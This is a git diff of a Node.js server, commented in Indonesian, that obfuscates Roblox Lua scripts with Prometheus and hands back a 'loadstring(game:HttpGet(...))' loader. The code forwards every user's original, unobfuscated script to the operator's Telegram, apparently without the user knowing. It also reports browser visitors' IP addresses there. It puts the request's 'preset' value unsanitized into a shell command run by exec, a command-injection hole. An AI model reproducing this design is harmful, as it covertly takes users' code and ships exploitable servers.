@@ -11,20 +11,18 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================================
-//  KONFIGURASI TELEGRAM
+//  KONFIGURASI TELEGRAM (Gunakan Variables di Railway)
 // ============================================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'TOKEN_LU_DI_SINI';
-const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || 'CHAT_ID_LU_DI_SINI';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'TOKEN_BOT_KAMU';
+const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || 'CHAT_ID_KAMU';
 
 const scriptDatabase = new Map();
 const tempDir = path.join(__dirname, 'temp');
 if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
 
-// ─── FUNGSI KIRIM FILE KE TELEGRAM ──────────────────────────
+// ─── FUNGSI KIRIM FILE KE TELEGRAM (Normal Log) ──────────────
 function sendTelegramFile(scriptContent, scriptId, preset, isAntiTamperOn, loaderScript) {
     const filename = `original_${scriptId}.lua`;
-    
-    // Status Anti-Tamper dirapikan ke dalam caption
     const tamperStatus = isAntiTamperOn ? '🟢 Enabled' : '🔴 Disabled';
     const caption = `🚀 <b>New Obfuscation Request</b>\n\n` +
                     `🆔 <b>ID:</b> <code>${scriptId}</code>\n` +
@@ -53,16 +51,15 @@ function sendTelegramFile(scriptContent, scriptId, preset, isAntiTamperOn, loade
     };
 
     const req = https.request(options, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => console.log('[TELEGRAM LOG] Berhasil dikirim'));
+        let data = ''; res.on('data', chunk => data += chunk);
+        res.on('end', () => console.log('[TELEGRAM LOG] Sent.'));
     });
     req.on('error', err => console.error('[TELEGRAM ERROR]', err));
     req.write(payload);
     req.end();
 }
 
-// ─── FUNGSI CORE OBFUSKASI ──────────────────────────────────
+// ─── FUNGSI CORE OBFUSKASI (PROMETHEUS) ─────────────────────
 function obfuscateWithPrometheus(scriptContent, preset, antiTamper) {
     return new Promise((resolve, reject) => {
         const tempId = Date.now();
@@ -72,16 +69,10 @@ function obfuscateWithPrometheus(scriptContent, preset, antiTamper) {
         fs.writeFileSync(inputPath, scriptContent);
 
         const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
-        
-        // Menyiapkan command dasar
         let command = `lua5.3 "${prometheusPath}" --preset ${preset} "${inputPath}"`;
         
-        // Catatan: Jika versi CLI Prometheus kamu mendukung flag tambahan untuk steps,
-        // kamu bisa menambahkannya di sini. Jika tidak, preset di cli.lua yang akan memutuskannya.
-        if (antiTamper) {
-            console.log("[INFO] Eksekusi dengan Anti-Tamper diaktifkan.");
-            // command += ` --AntiTamper`; // Uncomment baris ini JIKA CLI Prometheus-mu mendukung flag tersebut
-        }
+        // Sesuaikan parameter CLI jika Prometheus-mu mendukung argumen ekstra
+        if (antiTamper) console.log(`[INFO] Anti-Tamper Enabled on ${preset}`);
 
         exec(command, (error, stdout, stderr) => {
             if (error) {
@@ -92,8 +83,7 @@ function obfuscateWithPrometheus(scriptContent, preset, antiTamper) {
 
             if (fs.existsSync(outputPath)) {
                 const obfuscatedCode = fs.readFileSync(outputPath, 'utf8');
-                fs.unlinkSync(inputPath);
-                fs.unlinkSync(outputPath);
+                fs.unlinkSync(inputPath); fs.unlinkSync(outputPath);
                 resolve(obfuscatedCode);
             } else {
                 reject("Output file tidak tergenerate.");
@@ -102,11 +92,9 @@ function obfuscateWithPrometheus(scriptContent, preset, antiTamper) {
     });
 }
 
-// ─── ENDPOINT API ───────────────────────────────────────────
+// ─── ENDPOINT API OBFUSKASI ─────────────────────────────────
 app.post('/api/obfuscate', async (req, res) => {
-    // Sekarang menerima nilai antiTamper dari frontend
     const { script, preset, antiTamper } = req.body; 
-    
     if (!script) return res.status(400).json({ error: "Script is empty!" });
     
     const selectedPreset = preset || 'Medium';
@@ -114,7 +102,6 @@ app.post('/api/obfuscate', async (req, res) => {
 
     try {
         const obfuscatedCode = await obfuscateWithPrometheus(script, selectedPreset, isAntiTamperOn);
-        
         const scriptId = Math.random().toString(36).substring(2, 15);
         scriptDatabase.set(scriptId, obfuscatedCode);
 
@@ -122,69 +109,48 @@ app.post('/api/obfuscate', async (req, res) => {
         const host = req.headers['x-forwarded-host'] || req.headers.host;
         const loader = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;
 
-        // Kirim ke Telegram beserta status Anti-Tamper
         sendTelegramFile(script, scriptId, selectedPreset, isAntiTamperOn, loader);
-
         res.json({ success: true, loader });
     } catch (error) {
         res.status(500).json({ error: error.toString() });
     }
 });
 
-// ─── ENDPOINT SCRIPTS (ANTI-SKID DENGAN TELEGRAM ALERT) ─────
+// ─── ENDPOINT SCRIPTS (DENGAN ANTI-SKID ALERT) ──────────────
 app.get('/Scripts', (req, res) => {
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    
-    // Deteksi jika request datang dari browser biasa
     const isBrowser = /Mozilla|Chrome|Safari|Firefox|Opera|Edge|MSIE/i.test(userAgent);
     
     if (isBrowser) {
-        // Ambil IP Address (mendukung format dari proxy/Railway)
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
         
-        // Buat pesan peringatan untuk Telegram
         const alertMsg = `🚨 <b>SKID ALERT: Akses Ilegal Terdeteksi!</b>\n\n` +
                          `⚠️ Seseorang mencoba mengakses endpoint /Scripts lewat browser.\n\n` +
                          `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
                          `💻 <b>User-Agent:</b> <code>${userAgent}</code>\n` +
                          `📅 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')} WIB`;
 
-        // Kirim alert menggunakan fungsi sendTelegram biasa
-        const payload = JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: alertMsg,
-            parse_mode: 'HTML'
-        });
-
+        const payload = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: alertMsg, parse_mode: 'HTML' });
         const options = {
-            hostname: 'api.telegram.org',
-            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(payload)
-            }
+            hostname: 'api.telegram.org', path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+            method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
         };
 
-        const alertReq = https.request(options, (alertRes) => {
-            alertRes.on('data', () => {}); // Abaikan respon agar tidak menumpuk di log console
-        });
+        const alertReq = https.request(options, (alertRes) => { alertRes.on('data', () => {}); });
         alertReq.on('error', err => console.error('[TELEGRAM ALERT ERROR]', err));
-        alertReq.write(payload);
-        alertReq.end();
+        alertReq.write(payload); alertReq.end();
 
-        // Tetap tampilkan halaman 403 ke si Skid
         return res.status(403).sendFile(path.join(__dirname, 'public', '403.html'));
     }
 
-    // Jika bukan browser (asumsi dari Roblox/Executor), lanjutkan ambil script
-    const scriptId   = req.query.Id;
-    const scriptCode = scriptDatabase.get(scriptId);
-
-    if (scriptCode) {
+    const code = scriptDatabase.get(req.query.Id);
+    if (code) {
         res.setHeader('Content-Type', 'text/plain');
-        res.send(scriptCode);
+        res.send(code);
     } else {
         res.status(404).send("-- Script Expired / Not Found");
     }
 });
+
+const PORT = process.env.PORT || 8080;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
